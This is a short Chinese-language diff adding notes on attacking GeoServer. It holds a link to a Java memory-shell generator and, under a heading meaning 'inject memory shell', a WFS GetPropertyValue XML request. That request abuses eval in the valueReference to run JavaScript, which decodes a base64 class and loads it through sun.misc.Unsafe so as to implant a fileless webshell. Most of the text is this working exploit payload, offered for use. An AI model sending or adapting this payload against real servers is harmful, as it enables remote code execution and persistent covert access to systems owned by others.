@@ -1,1 +1,30 @@
 GeoServer https://mp.weixin.qq.com/s/7FGOddQdXJsy7FF_hJAGSQ
+
+https://github.com/pen4uin/java-memshell-generato
+
+##　注入内存马
+```xml
+<wfs:GetPropertyValue service='WFS' version='2.0.0'
+ xmlns:topp='http://www.openplans.org/topp'
+ xmlns:fes='http://www.opengis.net/fes/2.0'
+ xmlns:wfs='http://www.opengis.net/wfs/2.0'>
+ <wfs:Query typeNames='sf:archsites'/>
+ <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManage
+r.new(),'js'),'
+var str="";
+var bt;
+try {
+ bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().d
+ecodeBuffer(str);
+} catch (e) {
+ bt = java.util.Base64.getDecoder().decode(str);
+}
+var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredFiel
+d("theUnsafe");
+theUnsafe.setAccessible(true);
+unsafe = theUnsafe.get(null);
+unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), b
+t, null).newInstance();
+')</wfs:valueReference>
+</wfs:GetPropertyValue>
+```
